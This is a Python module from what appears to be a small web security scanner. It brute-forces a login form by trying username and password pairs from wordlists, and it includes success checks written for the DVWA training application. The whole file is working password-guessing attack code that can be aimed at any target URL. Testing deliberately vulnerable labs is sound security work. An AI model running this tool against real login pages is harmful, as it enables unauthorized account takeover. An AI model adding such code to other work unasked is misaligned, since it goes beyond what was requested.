# modules/bruteforce.py
import os, time, requests
from typing import Optional, Dict, Any, List

DEFAULT_WORDLIST_DIR = os.path.join(os.path.dirname(__file__), "payloads", "wordlists")

def _read_lines(path: str) -> List[str]:
    if not path or not os.path.isfile(path):
        return []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [x.strip() for x in f if x.strip()]

def _load_dicts(wordlist: Optional[str]):
    users = _read_lines(os.path.join(DEFAULT_WORDLIST_DIR, "users.txt")) or ["admin"]
    pws = _read_lines(os.path.join(DEFAULT_WORDLIST_DIR, "passwords.txt")) or ["password", "admin", "123456"]
    if wordlist and os.path.isfile(wordlist):
        pws = _read_lines(wordlist)
    return users, pws

def _make_url(target: str, login_path: Optional[str]):
    t = target.rstrip("/")
    if login_path:
        if not login_path.startswith("/"):
            login_path = "/" + login_path
        return t + login_path
    return t

def _is_success(r: requests.Response, text: str, url: str, success_indicator: Optional[str]) -> bool:
    low = text.lower()
    # 如果自定义关键字存在
    if success_indicator and success_indicator.lower() in low:
        return True

    # 针对 DVWA /login.php
    if "login.php" in url:
        if "login failed" not in low and r.status_code in (302, 301):
            return True
        if "login failed" not in low and "logout" in low:
            return True

    # 针对 DVWA /vulnerabilities/brute/
    if "vulnerabilities/brute" in url:
        if "welcome" in low and "incorrect" not in low:
            return True

    # 通用规则
    if r.status_code >= 300 and r.status_code < 400:
        return True
    if "welcome" in low or "logout" in low or "administrator" in low:
        return True
    return False

def scan(target: str,
         session: Optional[requests.Session] = None,
         login_path: Optional[str] = None,
         user_field: str = "username",
         pass_field: str = "password",
         submit_field: Optional[Dict[str, str]] = None,
         success_indicator: Optional[str] = None,
         max_attempts: int = 300,
         delay: float = 0.4,
         wordlist: Optional[str] = None,
         method: str = "POST",
         **kwargs) -> Dict[str, Any]:
    s = session or requests.Session()
    s.headers.update({"User-Agent": "MiniScanner-Brute/2.0"})

    login_url = _make_url(target, login_path)
    users, passwords = _load_dicts(wordlist)

    evidence = []
    detected = False
    found = None
    attempts = 0

    for u in users:
        for pw in passwords:
            attempts += 1
            if attempts > max_attempts:
                break
            data = {user_field: u, pass_field: pw}
            if submit_field:
                data.update(submit_field)
            try:
                start = time.time()
                if method.upper() == "POST":
                    r = s.post(login_url, data=data, timeout=10, allow_redirects=False)
                else:
                    r = s.get(login_url, params=data, timeout=10, allow_redirects=False)
                elapsed = round(time.time() - start, 3)
                text = r.text or ""
                ok = _is_success(r, text, login_url, success_indicator)

                # 只在有显著结果时记录
                if ok:
                    detected = True
                    found = {"username": u, "password": pw}
                    evidence.append({
                        "username": u,
                        "password": pw,
                        "status_code": r.status_code,
                        "time": elapsed,
                        "succeeded": True
                    })
                    return {
                        "name": "bruteforce",
                        "target": target,
                        "detected": True,
                        "vulnerable_payload": found,
                        "evidence": evidence,
                        "attempts_tried": attempts,
                        "notes": "Found valid credentials (first success)."
                    }
            except Exception as e:
                continue
            time.sleep(delay)

    return {
        "name": "bruteforce",
        "target": target,
        "detected": False,
        "vulnerable_payload": None,
        "evidence": evidence,
        "attempts_tried": attempts,
        "notes": "No valid credentials found with provided lists."
    }
